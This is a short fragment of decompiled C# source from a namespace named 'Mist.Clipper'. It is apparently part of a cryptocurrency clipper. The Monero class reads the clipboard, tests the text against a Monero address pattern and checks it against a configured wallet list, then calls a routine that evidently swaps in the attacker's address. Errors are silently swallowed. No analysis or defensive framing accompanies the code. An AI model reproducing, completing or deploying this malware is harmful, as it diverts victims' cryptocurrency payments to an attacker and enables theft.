using System;
using System.Linq;
using System.Windows;

namespace Mist.Clipper
{
	// Token: 0x0200007E RID: 126
	internal class Monero
	{
		// Token: 0x060002E4 RID: 740 RVA: 0x000135EC File Offset: 0x000117EC
		public static void GetMoneroWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletsxmr.Contains(text) && CheckXMR.Clipregex(text))
					{
						CheckXMR.SetsXMR(text);
					}
				}
			}
			catch
			{
			}
		}
	}
}
